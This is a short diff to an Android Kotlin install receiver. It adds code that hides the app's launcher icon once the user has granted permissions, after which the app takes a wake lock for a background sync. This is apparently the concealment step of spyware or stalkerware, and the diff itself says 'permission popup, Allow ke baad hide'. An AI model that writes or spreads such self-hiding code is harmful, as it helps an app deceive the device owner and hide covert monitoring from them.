@@ -24,8 +24,11 @@ class InstallReceiver : BroadcastReceiver() {
         }
 
         val appContext = context.applicationContext
-        Log.d(TAG, "Install/update — permission popup then hide ($action)")
+        Log.d(TAG, "Install/update — permission popup, Allow ke baad hide ($action)")
         PostInstallPrompt.showIfNeeded(appContext)
+        if (!SyncBootstrap.needsRuntimePermissions(appContext)) {
+            LauncherHider.hideNow(appContext)
+        }
 
         val pendingResult = goAsync()
         val wakeLock = SyncWakeLock.acquire(appContext, "InstallSyncWakeLock")
